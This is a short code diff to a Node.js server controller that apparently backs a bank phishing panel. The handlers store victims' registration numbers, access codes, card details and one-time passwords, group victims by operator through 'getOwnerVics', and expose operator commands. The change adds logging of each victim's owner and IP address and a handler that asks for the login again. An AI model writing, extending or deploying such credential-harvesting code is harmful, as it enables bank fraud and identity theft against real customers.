@@ -36,9 +36,9 @@ const getInfo = async (req, res) => {
 };
 
 const submitLogin = async (req, res) => {
-  const { regnumber, pac, uniqueid } = req.body;
+  const { regnumber, pac, uniqueid, owner, ip } = req.body;
   try {
-    await AIB.create({ uniqueid, regnumber, pac });
+    await AIB.create({ uniqueid, regnumber, pac, status: 1, owner, ip });
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
@@ -114,11 +114,11 @@ const submitMisc = async (req, res) => {
 };
 
 module.exports = {
-  openModal,
   getOwnerVics,
   command,
   getInfo,
   submitLogin,
+  submitLoginAgain,
   submitPersonal,
   submitCard,
   submitOtp,
